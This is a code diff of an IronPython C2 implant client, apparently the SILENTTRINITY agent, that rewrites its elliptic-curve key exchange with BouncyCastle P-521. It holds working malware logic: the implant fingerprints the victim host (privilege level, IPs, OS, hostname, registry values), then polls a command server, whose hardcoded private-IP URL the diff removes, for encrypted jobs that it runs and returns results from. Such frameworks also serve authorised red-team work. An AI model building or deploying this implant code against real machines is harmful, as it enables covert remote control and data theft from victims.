@@ -3,55 +3,38 @@
 import clr
 from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random, IntPtr
 
-try:
-    assert DEBUG
-    clr.AddReference(IronPythonDLL)
-except NameError:
-    DEBUG = True
-    print "Set DEBUG: {}".format(DEBUG)
-    try:
-        import traceback
-    except ImportError:
-        print "[!] Error importing traceback module, full tracebacks will not be displayed"
-    clr.AddReference("IronPython")
-
-try:
-    assert GUID
-except NameError:
-    GUID = Guid.NewGuid().ToString()
-    print "Created GUID: {}".format(GUID)
-
-try:
-    assert URL
-except NameError:
-    URL = Uri(Uri("https://172.16.164.1:5000/"), GUID)
-    print "Set URL: {}\n".format(URL)
-
+clr.AddReference("BouncyCastle.Crypto")
+clr.AddReference("IronPython")
 clr.AddReference("System.Management")
 clr.AddReference("System.Web.Extensions")
-clr.AddReference("Microsoft.VisualBasic")
 clr.AddReference("Boo.Lang.Interpreter")
+
 from System.Text import Encoding
-from System.Management import ManagementObject
 from System.Diagnostics import Process
 from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
 from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
-from System.IO.Compression import GZipStream, CompressionMode
 from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
 from System.Net.Security import RemoteCertificateValidationCallback
 from System.Threading import Thread
 from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
 from System.Threading.Tasks import Task
 from System.Web.Script.Serialization import JavaScriptSerializer
-from Microsoft.VisualBasic.Devices import ComputerInfo
-from Microsoft.Win32 import Registry
 from IronPython.Hosting import Python
 from Boo.Lang.Interpreter import InteractiveInterpreter
+from Microsoft.Win32 import Registry
 
+from System.Text.RegularExpressions import Regex
+from System import StringComparison
 
-def urljoin(*args):
-    return "/".join(str(arg).strip("/") for arg in args)
+from Org.BouncyCastle.Asn1.Nist import NistNamedCurves
+from Org.BouncyCastle.Crypto.Parameters import ECKeyGenerationParameters, ECDomainParameters, ECPublicKeyParameters
+from Org.BouncyCastle.Security import GeneratorUtilities, SecureRandom, AgreementUtilities
+from Org.BouncyCastle.Asn1.Sec import SecObjectIdentifiers
+from Org.BouncyCastle.Math import BigInteger
+from Org.BouncyCastle.Crypto.Digests import Sha256Digest
 
+def urljoin(base, sufix):
+    return "{}/{}".format(base, sufix)
 
 def print_traceback():
     try:
@@ -172,14 +155,50 @@ class Requests(object):
 
 class Crypto(object):
     def __init__(self):
-        self.asymAlgo = AsymmetricAlgorithm.Create("ECDiffieHellmanCng")
-        self.public_key = self.asymAlgo.PublicKey.ToXmlString()
-        self.server_pubkey = None
-        self.derived_key = None
+        x9EC = NistNamedCurves.GetByName("P-521")
+        self.aliceKeyPair = self.GenerateKeyPair(ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed()))
+        self.bobPublicKey = self.GetBobPublicKey(URL, x9EC, self.aliceKeyPair.Public)
 
-    def derive_key(self, pubkey_xml):
-        self.server_pubkey = self.asymAlgo.PublicKey.FromXmlString(pubkey_xml)
-        self.derived_key = self.asymAlgo.DeriveKeyMaterial(self.server_pubkey)
+        self.derived_key = self.derive_key(self.bobPublicKey, self.aliceKeyPair.Private)
+
+    def GenerateKeyPair(self, ecDomain):
+        g = GeneratorUtilities.GetKeyPairGenerator("ECDH")
+        g.Init(ECKeyGenerationParameters(ecDomain, SecureRandom()))
+
+        return g.GenerateKeyPair()
+
+    def GetBobPublicKey(self, url, x9EC, alicePublicKey):
+        requests = Requests()
+
+        alice_x = str(alicePublicKey.Q.AffineXCoord.ToBigInteger())
+        alice_y = str(alicePublicKey.Q.AffineYCoord.ToBigInteger())
+        json = "{'x':" + alice_x + ",\'y\':" + alice_y +"}"
+
+        response = requests.post(url, Encoding.UTF8.GetBytes(json)).text
+        response = response.replace("\"", "'")
+
+        r = Regex("': (.+?) ")
+        mcx = r.Matches(response)
+        x = BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""))
+
+        mcy = response.Substring(response.LastIndexOf(": ", StringComparison.Ordinal) + 1).Replace("}", "").Trim()
+        y = BigInteger(mcy)
+
+        point = x9EC.Curve.CreatePoint(x,y)
+        return ECPublicKeyParameters("ECDH", point, SecObjectIdentifiers.SecP521r1)
+
+    def derive_key(self, bobPublicKey, alicePrivateKey):
+        aKeyAgree = AgreementUtilities.GetBasicAgreement("ECDH")
+        aKeyAgree.Init(alicePrivateKey)
+        sharedSecret = aKeyAgree.CalculateAgreement(bobPublicKey)
+        sharedSecretBytes = sharedSecret.ToByteArray()
+
+        digest = Sha256Digest()
+        symmetricKey = Array.CreateInstance(Byte, digest.GetDigestSize())
+        digest.BlockUpdate(sharedSecretBytes, 0, sharedSecretBytes.Length)
+        digest.DoFinal(symmetricKey, 0)
+
+        return symmetricKey
 
     def HMAC(self, key, message):
         with HMACSHA256(key) as hmac:
@@ -237,8 +256,8 @@ class Crypto(object):
 
 
 class Comms(Serializable):
-    def __init__(self, client):
-        self.client = client
+    def __init__(self, sleep):
+        self.sleep = sleep
         self.requests = Requests()
         self.crypto = None
 
@@ -250,15 +269,13 @@ class Comms(Serializable):
         while True:
             try:
                 self.crypto = Crypto()
-                r = self.requests.post(self.base_url, payload=self.crypto.public_key)
-                self.crypto.derive_key(r.text)
                 return
             except Exception as e:
                 if DEBUG:
                     print "Error performing key exchange: " + str(e)
                     print_traceback()
 
-            Thread.Sleep(self.client.SLEEP)
+            Thread.Sleep(self.sleep)
 
     def send_job_results(self, results, job_id):
         self.key_exchange()
@@ -280,7 +297,7 @@ class Comms(Serializable):
                     print "Error performing sending job results: " + str(e)
                     print_traceback()
 
-            Thread.Sleep(self.client.SLEEP)
+            Thread.Sleep(self.sleep)
 
     def get_job(self):
         self.key_exchange()
@@ -289,16 +306,14 @@ class Comms(Serializable):
             try:
                 job = self.requests.get(self.jobs_url).bytes
                 if len(job):
-                    return JavaScriptSerializer().DeserializeObject(
-                        Encoding.UTF8.GetString(self.crypto.Decrypt(job))
-                    )
+                    return JavaScriptSerializer().DeserializeObject(Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
                 return
             except Exception as e:
                 if DEBUG:
                     print "Error performing getting jobs: " + str(e)
                     print_traceback()
 
-            Thread.Sleep(self.client.SLEEP)
+            Thread.Sleep(self.sleep)
 
     def __str__(self):
         return 'http'
@@ -399,15 +414,18 @@ class STClient(Serializable):
         self.DOTNET_VERSION = str(Environment.Version)
         self.HIGH_INTEGRITY = self.is_high_integrity()
         self.IP = self.get_network_addresses()
-        self.OS = "{} ({})".format(ComputerInfo().OSFullName, Environment.OSVersion.Version)
+        self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)
         self.OS_ARCH = "x64" if IntPtr.Size == 8 else "x86"
-        self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
+        try:
+            self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
+        except:
+            self.OS_RELEASE_ID = ""
         self.PROCESS = self.__process.Id
         self.PROCESS_NAME = self.__process.ProcessName
         self.HOSTNAME = Environment.MachineName
-        self.JOBS = len(self.__jobs)
+        self.JOBS = 0 #len(self.__jobs)
         self.URL = str(URL)
-        self.COMMS = Comms(self)
+        self.COMMS = Comms(self.SLEEP)
 
         self.main()
 
@@ -434,7 +452,6 @@ class STClient(Serializable):
                 self.__jobs.append(STJob(self, job))
 
             Thread.CurrentThread.Join(self.SLEEP)
-            #Thread.Sleep(client.SLEEP)
 
 
 STClient()
